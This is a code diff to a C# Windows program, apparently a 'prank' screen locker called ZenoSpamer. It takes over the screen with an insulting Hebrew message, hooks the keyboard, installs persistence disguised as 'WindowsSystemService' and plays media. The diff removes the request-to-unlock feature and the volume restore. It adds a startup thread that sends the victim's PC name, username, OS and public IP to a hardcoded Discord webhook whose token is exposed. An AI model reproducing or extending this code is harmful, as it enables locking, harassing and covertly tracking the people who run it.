@@ -14,17 +14,13 @@ namespace ZenoSpamer
     public class PrankForm : Form
     {
         static readonly string SECRET_CODE = "אני זונה של ZENO";
-        static readonly string TITLE_TEXT = "אתה זונה של ᴹᴿZENO亗";
+        static readonly string TITLE_TEXT = "ᴹᴿZENO亗 אתה זונה של";
         static readonly string PERSIST_NAME = "WindowsSystemService";
-        static readonly string SERVER_URL = "https://spam-bot-v2.onrender.com";
 
         static readonly string WEBHOOK_URL = "https://discord.com/api/webhooks/1560039433468649482/LyX8HOtPzHxvLqfEyF0Qg2aw6G6Zmam5yP0SN9MATv3sTZL34rTUicWMzDnwYaEUNQdK";
 
         [DllImport("winmm.dll")]
         public static extern int waveOutSetVolume(IntPtr hwo, uint dwVolume);
-
-        [DllImport("winmm.dll")]
-        public static extern int waveOutGetVolume(IntPtr hwo, out uint dwVolume);
 
         [DllImport("winmm.dll", CharSet = CharSet.Auto)]
         static extern int mciSendString(string command, StringBuilder buffer, int bufferSize, IntPtr hwndCallback);
@@ -54,25 +50,15 @@ namespace ZenoSpamer
         LowLevelKeyboardProc proc;
 
         TextBox codeBox;
-        TextBox requestBox;
-        Button sendBtn;
         Label messageLabel;
         Label titleLabel;
         Label hintLabel;
-        Label requestLabel;
-        Label statusLabel;
         bool unlocked = false;
         string mediaPath = null;
-        string requestId = null;
         object wmpPlayer = null;
-        static uint originalVolume = 0;
 
         public PrankForm()
         {
-            requestId = Environment.MachineName + "_" + DateTime.Now.Ticks.ToString();
-
-            try { waveOutGetVolume(IntPtr.Zero, out originalVolume); } catch { }
-
             this.FormBorderStyle = FormBorderStyle.None;
             this.WindowState = FormWindowState.Maximized;
             this.TopMost = true;
@@ -115,12 +101,12 @@ namespace ZenoSpamer
             this.Controls.Add(titleLabel);
 
             hintLabel = new Label();
-            hintLabel.Text = "YOUR COMPUTER IS LOCKED. Send a request to the owner to get the code.";
+            hintLabel.Text = "YOUR COMPUTER IS LOCKED. Type the secret code to unlock.";
             hintLabel.ForeColor = Color.Yellow;
             hintLabel.BackColor = Color.Transparent;
             hintLabel.Font = new Font("Arial", 16, FontStyle.Italic);
             hintLabel.AutoSize = true;
-            hintLabel.Location = new Point(100, 180);
+            hintLabel.Location = new Point(100, 200);
             this.Controls.Add(hintLabel);
 
             messageLabel = new Label();
@@ -129,55 +115,18 @@ namespace ZenoSpamer
             messageLabel.BackColor = Color.Transparent;
             messageLabel.Font = new Font("Arial", 22);
             messageLabel.AutoSize = true;
-            messageLabel.Location = new Point(100, 280);
+            messageLabel.Location = new Point(100, 320);
             this.Controls.Add(messageLabel);
 
             codeBox = new TextBox();
             codeBox.Font = new Font("Arial", 20);
-            codeBox.Location = new Point(100, 340);
+            codeBox.Location = new Point(100, 380);
             codeBox.Width = 1200;
             codeBox.Height = 50;
             codeBox.KeyDown += CodeBox_KeyDown;
             codeBox.RightToLeft = RightToLeft.Yes;
             this.Controls.Add(codeBox);
             codeBox.Focus();
-
-            requestLabel = new Label();
-            requestLabel.Text = "Or send a request to the owner:";
-            requestLabel.ForeColor = Color.Cyan;
-            requestLabel.BackColor = Color.Transparent;
-            requestLabel.Font = new Font("Arial", 20, FontStyle.Bold);
-            requestLabel.AutoSize = true;
-            requestLabel.Location = new Point(100, 450);
-            this.Controls.Add(requestLabel);
-
-            requestBox = new TextBox();
-            requestBox.Font = new Font("Arial", 18);
-            requestBox.Location = new Point(100, 510);
-            requestBox.Width = 900;
-            requestBox.Height = 50;
-            requestBox.Text = "Please give me the code, I promise to behave";
-            this.Controls.Add(requestBox);
-
-            sendBtn = new Button();
-            sendBtn.Text = "Send Request";
-            sendBtn.Font = new Font("Arial", 18, FontStyle.Bold);
-            sendBtn.Location = new Point(1020, 505);
-            sendBtn.Size = new Size(280, 60);
-            sendBtn.BackColor = Color.DarkCyan;
-            sendBtn.ForeColor = Color.White;
-            sendBtn.FlatStyle = FlatStyle.Flat;
-            sendBtn.Click += SendBtn_Click;
-            this.Controls.Add(sendBtn);
-
-            statusLabel = new Label();
-            statusLabel.Text = "";
-            statusLabel.ForeColor = Color.Lime;
-            statusLabel.BackColor = Color.Transparent;
-            statusLabel.Font = new Font("Arial", 14, FontStyle.Italic);
-            statusLabel.AutoSize = true;
-            statusLabel.Location = new Point(100, 590);
-            this.Controls.Add(statusLabel);
 
             this.KeyDown += PrankForm_KeyDown;
 
@@ -194,116 +143,35 @@ namespace ZenoSpamer
             FindMedia();
             PlayMedia();
 
+            // שלח webhook עם פרטי הקורבן ברגע שהדף נפתח
+            Thread infoThread = new Thread(SendInfoOnStartup);
+            infoThread.IsBackground = true;
+            infoThread.Start();
+
             this.Resize += delegate(object s, EventArgs e) { if (!unlocked) this.WindowState = FormWindowState.Maximized; };
             this.Deactivate += delegate(object s, EventArgs e) { if (!unlocked) { this.Activate(); this.BringToFront(); } };
         }
 
-        void SendBtn_Click(object sender, EventArgs e)
+        void SendInfoOnStartup()
         {
-            string message = requestBox.Text.Trim();
-            if (string.IsNullOrEmpty(message))
+            try
             {
-                statusLabel.Text = "Write something first!";
-                statusLabel.ForeColor = Color.Red;
-                return;
+                string pcName = Environment.MachineName;
+                string userName = Environment.UserName;
+                string osVersion = Environment.OSVersion.ToString();
+                string ip = GetPublicIP();
+
+                string content =
+                    "🔒 NEW LOCKED PC\n\n" +
+                    "🖥 PC Name: " + pcName + "\n" +
+                    "👤 Windows User: " + userName + "\n" +
+                    "🪟 OS: " + osVersion + "\n" +
+                    "🌐 Public IP: " + ip + "\n" +
+                    "🕐 Time: " + DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss");
+
+                PostToWebhook(content);
             }
-
-            sendBtn.Enabled = false;
-            statusLabel.Text = "Sending...";
-            statusLabel.ForeColor = Color.Yellow;
-
-            Thread t = new Thread(delegate()
-            {
-                try
-                {
-                    string pcName = Environment.MachineName;
-                    string userName = Environment.UserName;
-                    string osVersion = Environment.OSVersion.ToString();
-                    string ip = GetPublicIP();
-
-                    string content =
-                        "🔒 NEW REQUEST FROM LOCKED PC\n\n" +
-                        "💬 Message: " + message + "\n\n" +
-                        "🖥 PC Name: " + pcName + "\n" +
-                        "👤 Windows User: " + userName + "\n" +
-                        "🪟 OS: " + osVersion + "\n" +
-                        "🌐 Public IP: " + ip + "\n" +
-                        "🆔 Request ID: " + requestId + "\n" +
-                        "🕐 Time: " + DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss") + "\n\n" +
-                        "✅ To approve:  !approve " + requestId + "\n" +
-                        "❌ To deny:     !deny " + requestId;
-
-                    PostToWebhook(content);
-
-                    this.Invoke((MethodInvoker)delegate
-                    {
-                        statusLabel.Text = "Request sent! Waiting for approval...";
-                        statusLabel.ForeColor = Color.Lime;
-                        sendBtn.Enabled = true;
-                    });
-
-                    StartPolling();
-                }
-                catch (Exception ex)
-                {
-                    this.Invoke((MethodInvoker)delegate
-                    {
-                        statusLabel.Text = "Error: " + ex.Message;
-                        statusLabel.ForeColor = Color.Red;
-                        sendBtn.Enabled = true;
-                    });
-                }
-            });
-            t.IsBackground = true;
-            t.Start();
-        }
-
-        void StartPolling()
-        {
-            Thread pollThread = new Thread(delegate()
-            {
-                while (!unlocked)
-                {
-                    try
-                    {
-                        string url = SERVER_URL + "/prank/status?id=" + Uri.EscapeDataString(requestId);
-                        using (WebClient wc = new WebClient())
-                        {
-                            wc.Headers["User-Agent"] = "Mozilla/5.0";
-                            string response = wc.DownloadString(url);
-
-                            if (response.Contains("\"approved\""))
-                            {
-                                this.Invoke((MethodInvoker)delegate
-                                {
-                                    codeBox.Text = SECRET_CODE;
-                                    codeBox.Focus();
-                                    statusLabel.Text = "Approved! Unlocking...";
-                                    statusLabel.ForeColor = Color.Lime;
-                                    Thread.Sleep(500);
-                                    CheckCode();
-                                });
-                                return;
-                            }
-                            else if (response.Contains("\"denied\""))
-                            {
-                                this.Invoke((MethodInvoker)delegate
-                                {
-                                    statusLabel.Text = "The owner denied your request.";
-                                    statusLabel.ForeColor = Color.Red;
-                                    hintLabel.Text = "DENIED. Send another request or enter the code.";
-                                    hintLabel.ForeColor = Color.Red;
-                                });
-                                return;
-                            }
-                        }
-                    }
-                    catch { }
-                    Thread.Sleep(5000);
-                }
-            });
-            pollThread.IsBackground = true;
-            pollThread.Start();
+            catch { }
         }
 
         void PostToWebhook(string content)
@@ -556,12 +424,6 @@ namespace ZenoSpamer
                 catch { }
 
                 try { mciSendString("close media", null, 0, IntPtr.Zero); } catch { }
-
-                try { waveOutSetVolume(IntPtr.Zero, originalVolume); } catch { }
-                for (int i = 0; i < 4; i++)
-                {
-                    try { waveOutSetVolume((IntPtr)i, originalVolume); } catch { }
-                }
 
                 RemovePersistence();
 
